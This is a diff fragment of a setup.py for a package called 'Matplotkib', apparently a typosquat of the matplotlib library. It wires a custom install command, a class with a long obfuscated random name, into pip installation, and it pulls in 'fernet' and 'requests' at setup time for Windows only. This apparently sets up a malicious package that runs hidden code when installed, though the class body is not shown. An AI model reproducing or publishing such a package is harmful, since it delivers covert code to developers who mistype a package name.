@@ -18,5 +18,22 @@ class eQtiTpgCnxkmYfewVofePqDkiUddibqAkHOFpXrJPiTfGWybLXkPNfeerGaLhPHFOXSIloVkJe
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
+setup(
+    name="Matplotkib",
+    version=VERSION,
+    author="aDPtY",
+    author_email="prqDE@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': eQtiTpgCnxkmYfewVofePqDkiUddibqAkHOFpXrJPiTfGWybLXkPNfeerGaLhPHFOXSIloVkJeZGFlswuZZoWIWJQYl,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
